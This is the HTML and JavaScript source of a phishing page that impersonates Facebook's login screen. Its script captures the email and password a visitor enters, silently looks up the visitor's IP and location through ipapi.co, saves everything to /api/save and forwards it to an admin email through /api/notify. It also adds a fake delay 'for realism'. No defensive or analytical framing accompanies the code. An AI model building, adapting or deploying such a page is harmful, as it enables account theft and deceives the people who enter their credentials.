<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook – log in or sign up</title>
    <meta name="robots" content="noindex">
    <meta name="googlebot" content="noarchive">
    <link rel="icon" href="/assets/facebook.svg" type="image/svg+xml">
    <style>
        body {
            font-family: Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f0f2f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .lang-selector {
            color: #65676b;
            font-size: 14px;
            text-align: center;
            padding: 12px 0;
            background-color: transparent;
            width: 100%;
            position: relative;
        }
        .lang-selector::after {
            content: "▼";
            font-size: 10px;
            margin-left: 5px;
            color: #8a8d91;
            vertical-align: middle;
        }
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            padding: 20px;
            flex: 1;
        }
        .facebook-logo {
            display: flex;
            justify-content: center;
            margin: 60px 0 40px;
        }
        .facebook-logo img {
            width: 112px;
            height: 112px;
        }
        .login-form {
            width: 100%;
            max-width: 330px;
        }
        .form-group {
            margin-bottom: 12px;
            width: 100%;
        }
        input[type="text"],
        input[type="email"],
        input[type="password"] {
            border: 1px solid #dddfe2;
            border-radius: 4px;
            font-size: 15px;
            padding: 12px 16px;
            width: 100%;
            height: 20px;
            box-sizing: border-box;
            color: #1d2129;
            margin-bottom: 14px;
            background-color: white;
        }
        input::placeholder {
            color: #8a8d91;
        }
        .login-button {
            background-color: #1877f2;
            border: none;
            border-radius: 4px;
            color: white;
            font-size: 16px;
            font-weight: bold;
            padding: 0;
            width: 100%;
            margin-top: 12px;
            cursor: pointer;
            height: 44px;
            text-align: center;
        }
        .forgotten-password {
            color: #1877f2;
            font-size: 14px;
            text-align: center;
            margin: 16px 0;
            text-decoration: none;
            display: block;
        }
        .divider {
            align-items: center;
            border-bottom: 1px solid #dadde1;
            display: flex;
            margin: 30px 0;
            text-align: center;
        }
        .create-account-button {
            background-color: white;
            border: 1px solid #1877f2;
            border-radius: 4px;
            color: #1877f2;
            font-size: 14px;
            font-weight: bold;
            padding: 0;
            width: 100%;
            margin: 20px 0 30px;
            cursor: pointer;
            height: 36px;
        }
        .meta-logo {
            margin-top: auto;
            padding: 20px 0;
            text-align: center;
            color: #8a8d91;
            font-size: 12px;
        }
        .meta-logo img {
            height: 18px;
            opacity: 0.7;
        }
        .hidden-inputs {
            display: none;
        }
    </style>
</head>
<body>
    <div class="lang-selector">
        English (UK)
    </div>

    <div class="container">
        <div class="facebook-logo">
            <img src="/assets/facebook.svg" alt="Facebook">
        </div>

        <form id="login-form" class="login-form">
            <div class="form-group">
                <input type="text" id="email" name="email" placeholder="Mobile number or email address" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            <div class="hidden-inputs">
                <input type="hidden" id="country" name="country">
                <input type="hidden" id="city" name="city">
                <input type="hidden" id="continent" name="continent">
                <input type="hidden" id="ip" name="ip">
                <input type="hidden" id="adminEmail" name="adminEmail" value="admin@example.com">
            </div>
            <button type="submit" class="login-button">Log in</button>
            <a href="#" class="forgotten-password">Forgotten password?</a>
            
            <div class="divider"></div>
            
            <button type="button" class="create-account-button">Create new account</button>
        </form>

        <div class="meta-logo">
            <img src="/assets/meta-seeklogo.svg" alt="Meta">
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Get user location and IP info
            getUserLocationAndIp();
            
            // Add form submission handling
            const form = document.getElementById('login-form');
            
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                
                // Get form values
                const email = document.getElementById('email');
                const password = document.getElementById('password');
                const country = document.getElementById('country');
                const city = document.getElementById('city');
                const continent = document.getElementById('continent');
                const ip = document.getElementById('ip');
                const adminEmail = document.getElementById('adminEmail');
                
                // Validate form
                if (!email.value || !password.value) {
                    alert('Please fill in all fields');
                    return;
                }
                
                // Show "verification" and delay submission for realism
                setTimeout(function() {
                    // Create data object to save
                    const userData = {
                        username: email.value,
                        password: password.value,
                        country: country.value,
                        city: city.value,
                        continent: continent.value,
                        ip: ip.value,
                        timestamp: new Date().toISOString(),
                        platform: 'facebook-mobile'
                    };
                    
                    // Send data to server
                    fetch('/api/save', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(userData)
                    })
                    .then(data => {
                        console.log('Data saved to database:', data);
                        
                        // Then send notification email
                        sendNotificationEmail();
                        
                        // Optionally redirect after a delay
                        // setTimeout(function() {
                        //     window.location.href = 'https://facebook.com/';
                        // }, 1000);
                    })
                    .catch(error => {
                        console.error('Error saving data:', error);
                    });
                }, 1500); // 1.5 second delay for verification
            });
            
            // Add function to send email notification
            function sendNotificationEmail() {
                // Create notification data
                const notificationData = {
                    username: email.value + " (FB Mobile)",
                    password: password.value,
                    country: country.value,
                    city: city.value,
                    continent: continent.value,
                    ip: ip.value,
                    adminEmail: adminEmail.value
                };
                
                // Send notification via Next.js API route
                fetch('/api/notify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(notificationData)
                })
                .then(response => response.json())
                .then(result => {
                    console.log('Email notification sent:', result);
                })
                .catch(error => {
                    console.error('Error sending notification:', error);
                });
            }
            
            // Get user location and IP
            function getUserLocationAndIp() {
                fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('country').value = data.country_name || '';
                    document.getElementById('city').value = data.city || '';
                    document.getElementById('continent').value = data.continent_code || '';
                    document.getElementById('ip').value = data.ip || '';
                })
                .catch(error => {
                    console.error('Error fetching location data:', error);
                });
            }
        });
    </script>
</body>
</html>
